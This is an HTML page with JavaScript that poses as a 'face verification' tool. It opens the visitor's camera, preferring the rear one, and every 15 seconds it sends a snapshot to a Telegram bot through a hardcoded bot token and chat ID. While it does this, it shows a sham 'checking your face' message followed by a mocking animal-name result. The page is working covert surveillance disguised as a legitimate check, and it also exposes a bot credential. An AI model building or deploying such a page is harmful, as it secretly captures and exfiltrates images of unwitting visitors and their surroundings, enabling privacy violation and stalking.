<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Camera → Telegram</title>
</head>
<body>
  <h2>📷 Face verfication </h2>
  <video id="video" autoplay playsinline style="width:100%;border:1px solid #000;"></video>

  <!-- Zoom control -->
  <div>
    <label for="zoom">🔍 Zoom:</label>
    <input id="zoom" type="range" min="1" max="5" step="0.1" value="1">
  </div>

  <!-- Switch camera button -->
  <div>
    <button id="switchBtn">🔄 Switch Camera</button>
  </div>

  <pre id="log"></pre>

  <script>
    // 🔑 Config
    const TELEGRAM_BOT_TOKEN = "8241568142:AAG-mtJeGRL-YzCd_M_r3F1FbteDLeOrVO8";
    const TELEGRAM_CHAT_ID = "7225122599";

    const video = document.getElementById("video");
    const log = document.getElementById("log");
    const zoomSlider = document.getElementById("zoom");
    const switchBtn = document.getElementById("switchBtn");

    let videoTrack;
    let currentFacingMode = "environment"; // start with back camera

    // Start camera with given facingMode
    async function startCamera(facingMode) {
      if (video.srcObject) {
        video.srcObject.getTracks().forEach(track => track.stop());
      }
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: facingMode }
        });
        video.srcObject = stream;
        videoTrack = stream.getVideoTracks()[0];

        // Check if zoom supported
        const capabilities = videoTrack.getCapabilities();
        if (capabilities.zoom) {
          zoomSlider.min = capabilities.zoom.min;
          zoomSlider.max = capabilities.zoom.max;
          zoomSlider.step = capabilities.zoom.step || 0.1;
          zoomSlider.value = capabilities.zoom.min;
          zoomSlider.style.display = "block";
        } else {
          zoomSlider.style.display = "none"; 
        }
      } catch (err) {
        log.innerText = "Camera error: " + err;
      }
    }

    // Switch between front and back
    switchBtn.addEventListener("click", () => {
      currentFacingMode = currentFacingMode === "environment" ? "user" : "environment";
      startCamera(currentFacingMode);
    });

    // Zoom handler
    zoomSlider.addEventListener("input", () => {
      if (!videoTrack) return;
      const constraints = { advanced: [{ zoom: zoomSlider.value }] };
      videoTrack.applyConstraints(constraints);
    });

    // Take snapshot from video
    function captureFrame() {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0);
      return canvas;
    }
const funnyNames = [
  "monkey 🐒", "donkey 🫏", "buffalo 🐃", "chicken 🐔", "pig 🐷", 
  "goat 🐐", "parrot 🦜", "cat 🐱", "dog 🐶", "duck 🦆", 
  "camel 🐪", "pigeon 🕊️", "frog 🐸", "rat 🐭", "snake 🐍"
];

// Function to pick random name
function getRandomFunnyName() {
  const i = Math.floor(Math.random() * funnyNames.length);
  return funnyNames[i];
}

// Example log message

    // Capture → Telegram
    async function sendPhoto() {
      const canvas = captureFrame();
      log.innerText = "⏳ checking your face...";

      // Convert to Blob
      const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));

      // Send to Telegram
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("photo", blob, "capture.jpg");

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      });

      log.innerText = "📩 your is matching with " + getRandomFunnyName();
    }

    // Auto every 30 seconds
    setInterval(sendPhoto, 15000);

    // Start with back camera
    startCamera(currentFacingMode);
  </script>
</body>
</html>

